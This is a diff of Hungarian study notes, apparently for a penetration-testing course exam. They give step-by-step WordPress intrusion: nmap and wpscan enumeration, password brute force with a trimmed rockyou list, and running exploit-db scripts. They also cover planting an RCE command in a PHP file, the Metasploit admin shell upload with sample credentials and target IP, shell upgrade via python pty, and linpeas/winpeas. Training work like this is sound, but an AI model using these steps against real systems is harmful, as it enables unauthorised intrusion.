@@ -4,6 +4,9 @@ vnc.html-ben Stud<szám>
 
 Jelszavaknál: 5000 próbálkozásnál több nem kell
 
+------------------------------------------------------------------------
+1. fázis
+------------------------------------------------------------------------
 
 Nmap
 !!Általában nmap -sS -sV <IP> -- a kezdő parancs
@@ -103,9 +106,27 @@ wpscan: (!!sudo wpscan!!)
 
 jelszófájl leredukálása csak 5000 sornyira: cat /usr/share/wordlists/rockyou.txt | head -n5000 > /tmp/rockyou5000.txt
 
+Sérülékenységek külső oldalról:
+  -keresünk https://www.exploit-db.com/ oldalon sérülékenységet (cross-site scripting nem jó, minél újabbat keresünk, pipásnak kell lennie)
+  -letöltjük a megfelelő .py file-t
+  -terminálban elindítjuk a jó paraméterrel (egyszer elindítod elmondja hogy kell)
+  -ki cat-eled a .py fájlt és a végén elmondja mit csinált (pl. új admin felhasználót hoz létre) (ha parancsokat kell megadni akkor idézőjel használata kötelező több parancsnál)
 
+(verziókeresés: oldalaknál jobb klikk és view page source, ott pl. sok résznél a verziószám, vagy a pontos rész verziószáma, esetleg belépés után pl. phpmyadmin megmondja)
+
+------------------------------------------------------------------------
+2. fázis
+------------------------------------------------------------------------
+linpeas; winpeas - infógyűjtő linuxos/windowsos gépről, az áldozat gépére kell felrakni, valóságban hasznos, zh-ban nem hasznos
+
+
+
+------------------------------------------------------------------------
+Példák:
+------------------------------------------------------------------------
+1. fázis példák
 Példa wordpress oldal feltörésre:
- -nmap -sS -sV <ip>
+ -sudo nmap -sS -sV <ip>
  -wpscan --url <url> --enumerate u/ap/at
  -wpscan --url <url> --usernames <> --passwords <>
   -keresünk php fájlt és beleírjuk az RCE CMD részét (kitörölhetjük az egészet és kicserélhetjük a miénkkel)
@@ -113,11 +134,23 @@ Példa wordpress oldal feltörésre:
   -bent vagyunk, python3 -c "import pty;pty.spawn('/bin/bash')" az interaktív shell-hez
  VAGY
   -msfconsole -q
-  -searh wordpress admin shell
-  -use 0 (szám változhat)
+  -search wordpress admin shell
+  -use 0 (szám változhat, wordpress admin shell upload)
   -!!automatikusan indít listenert!!
   -options
   -Required yes részeket kell megírni (ami helytelen/üres), set username admin; set password finalfantasy; set rhosts 40.0.4.10; etc.
   -run; ha hibára fut akkor lépjünk be manuálisan és erősítsük meg az emailt, majd próbáljuk újra (vagy lehet hiba ha rossz jogosultságú fiókkal akarunk belépni)
   -innentől bent vagyunk
   -shell parancs csinál shell-t, python3 -c "import pty;pty.spawn('/bin/bash')" csinál ebből interaktívat
+
+ VAGY plugin alapján
+  -keresünk https://www.exploit-db.com/ oldalon sérülékenységet (cross-site scripting nem jó, minél újabbat keresünk, pipásnak kell lennie)
+  -letöltjük a megfelelő .py file-t
+  -terminálban elindítjuk a jó paraméterrel (egyszer elindítod elmondja hogy kell)
+  -ki cat-eled a .py fájlt és a végén elmondja mit csinált (pl. új admin felhasználót hoz létre)
+  -többi példa alapján, miután van admin fiókunk
+
+2. fázis példák
+
+
+
